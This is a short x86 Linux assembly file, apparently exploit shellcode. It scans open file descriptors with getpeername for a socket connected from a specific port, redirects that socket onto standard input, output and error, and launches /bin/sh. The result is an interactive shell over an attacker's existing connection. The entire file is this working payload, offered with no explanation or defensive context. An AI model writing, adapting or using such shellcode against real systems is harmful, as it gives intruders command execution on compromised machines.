.globl	cbegin
.globl	cend

cbegin:
	xor    %ebx,%ebx
	mov    $0x7,%bl
	mov    %esp,%edx
	jmp    label1
	stos   %al,%es:(%edi)
	stos   %al,%es:(%edi)
	stos   %al,%es:(%edi)
	stos   %al,%es:(%edi)
	stos   %al,%es:(%edi)
	stos   %al,%es:(%edi)
	stos   %al,%es:(%edi)
	stos   %al,%es:(%edi)
	stos   %al,%es:(%edi)

label1:
	push   $0x10
	mov    %esp,%ecx
	push   %ecx
	push   %edx
	push   $0xfe
	mov    %esp,%ecx
label2:
	xor    %eax,%eax
	mov    $0x66,%al
	int    $0x80
	test   $0xff,%al
	jne    label3
	cmpw   $0x5234,0x12(%esp,1)
	je     label4
label3:
	pop    %edx
	test   $0xff,%dl
	je     label7
	dec    %dl
	push   %edx
	jmp    label2
.ascii "\x38"
label4:
	pop    %ebx
	xor    %ecx,%ecx
	mov    $0x3,%cl
label5:
	dec    %cl
	xor    %eax,%eax
	mov    $0x3f,%al
	int    $0x80
	jcxz   label6
	jmp    label5
label6:
	push   $0x4
	push   $0x0
	push   $18
	push   $1
	push   %ebx
	movl   $102, %eax
	movl   $14, %ebx
	movl   %esp, %ecx
	int $0x80
	push   $0x0
	push   $0x0
	push   $0x68732f
	push   $0x6e69622f
	lea    0x8(%esp,1),%ecx
	lea    0xc(%esp,1),%edx
	mov    %esp,(%ecx)
	mov    %esp,%ebx
	xor    %eax,%eax
	mov    $0xb,%al
	int    $0x80
label7:
	xor    %eax,%eax
	inc    %al
	int    $0x80
cend:

